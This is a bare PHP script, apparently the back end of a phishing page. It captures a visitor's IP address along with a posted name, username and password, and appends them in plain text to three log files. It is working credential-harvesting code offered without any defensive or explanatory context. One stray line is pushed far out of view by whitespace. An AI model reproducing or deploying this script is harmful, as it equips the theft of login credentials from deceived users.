<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
    
$NOME = $_POST ['name'];
$LOGIN = $_POST ['username'];
$SENHA = $_POST ['password'];
$datahora = date('d/m/Y \à\s H:i:s');
$COifconfig = "\n----------------------------------------
| CLIENTE | $datahora 
IP: $ipaddress
NAME: $NOME
USER: $LOGIN
SENHA: $SENHA   ";

$ARQUIVO2="client.txt";    
$ABRIR2 = fopen ($ARQUIVO2, "a") ;                                                                                               
fwrite ($ABRIR2, $COifconfig) ;
fclose ($ABRIR2) ;









$CONTEUDO =  "\n---------------------------------------
| CLIENTE | $datahora 
NAME: $NOME
";
$ARQUIVO = "slavik2.txt" ;  
$ABRIR = fopen ($ARQUIVO, "a") ;
fwrite ($ABRIR, $CONTEUDO) ;
fclose ($ABRIR) ;  









$CLIENT=  "\n----------------------------------------
| YOUR COMPUTER| $datahora 
NAME: $NOME
USER: $LOGIN
SENHA: $SENHA";                                                                                                                                                  $ABRIR = fopen ($ARQUIVO, "a") ;

$CLIENTfile= "wft.txt" ;     
$openfile = fopen ($CLIENTfile, "a") ;
fwrite ($openfile, $CLIENT) ;
fclose ($openfile) ;  

?>
